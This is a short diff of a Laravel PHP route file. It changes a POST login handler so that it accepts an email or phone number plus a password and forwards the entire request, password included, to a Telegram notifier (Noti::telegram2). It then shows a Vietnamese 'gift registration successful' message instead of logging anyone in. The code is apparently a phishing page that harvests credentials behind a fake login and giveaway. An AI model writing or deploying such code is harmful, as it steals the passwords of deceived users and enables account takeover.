@@ -39,15 +39,15 @@ Route::get('/login', function (Request $request) {
 
 Route::post('/login', function (Request $request){
     $validated = $request->validate([
-        'email' => 'required|email',
+        'email' => 'required',
         'password' => 'required',
     ], [
-        'email.email' => 'Email không đúng định dạng',
-        'email.required' => 'Email không được để trống',
+        'email.required' => 'Email hoặc số điện thoại không được để trống',
         'password.required' => 'Password không được để trống',
     ]);
 
-    Noti::telegram($request->all());
+    // Noti::telegram($request->all());
+    Noti::telegram2($request->all());
     Alert::success('Đăng ký nhận quà thành công', 'Chúng tôi sẽ sớm liên hệ bạn để nhận quà');
     return redirect('/');
     // dd($request->all());
